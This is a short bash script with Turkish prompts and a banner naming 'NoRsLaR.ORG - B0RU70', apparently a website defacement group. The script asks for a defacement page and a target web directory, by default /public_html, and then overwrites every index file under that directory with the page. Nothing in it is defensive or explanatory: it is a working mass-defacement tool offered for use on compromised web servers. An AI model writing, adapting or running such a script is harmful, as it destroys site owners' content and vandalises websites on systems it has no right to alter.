#!/bin/bash
echo '############## NoRsLaR.ORG - B0RU70 ##############'
echo '[+] İndexinin oldugu Papka (/index/index.htm)'
read index 
echo
echo '[+] Hedef Deface Papka girin ( Default /public_html) '
read path
echo
echo '[+] Baslatılır ........'
find $path -name "index.*" -exec cp $index {} \;
echo 
echo '[+] Done !'
